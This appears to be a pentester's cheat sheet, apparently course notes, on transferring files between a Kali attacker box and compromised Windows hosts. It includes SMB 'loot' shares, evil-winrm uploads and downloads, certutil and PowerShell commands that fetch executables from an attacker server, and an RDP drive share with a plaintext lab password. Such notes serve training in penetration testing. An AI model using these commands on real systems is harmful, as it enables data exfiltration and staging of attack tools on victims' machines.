# File Transfering & Downloading

## Kali - Windows (SMB Server)

**Kali Machine**

```bash
impacket-smbserver share //tmp/loot -smb2support -username pt -password pt
```

**Windows Machine**

```powershell
net use \\<kali-ip>\share /user:pt pt
copy file.txt \\<kali-ip>\share\
```

#### Evil-WinRM upload/download

```
## When we are inside a host in an internal network which we can't reach from the outside
## and we can't use the SMB protocol we can utilize evil-winrm native upload command
upload /file/from/local/kali C:\Users\user\file.txt

## Download a file from compromised machine to our machine
download /path/to/remote/file
```

## Kali -> Windows

{% tabs %}
{% tab title="certutil" %}
```bash
certutil -f -urlcache http://server/file.exe file.exe
```
{% endtab %}

{% tab title="powershell" %}
```powershell
iwr -uri http://server/file.exe -outfile C:\file.exe
```
{% endtab %}

{% tab title="ssh (windows -> kali)" %}
```bash
scp windows-file.txt parallels@<kali-ip>:/path/to/store
```
{% endtab %}
{% endtabs %}

#### Sharing Folders with RDP&#x20;

```bash
proxychains4 -q xfreerdp3 /u:yoshi /v:172.16.225.12 /d:medtech.com /p:Mushroom! /drive:/home/parallels/pen200/WindowsTools 
```
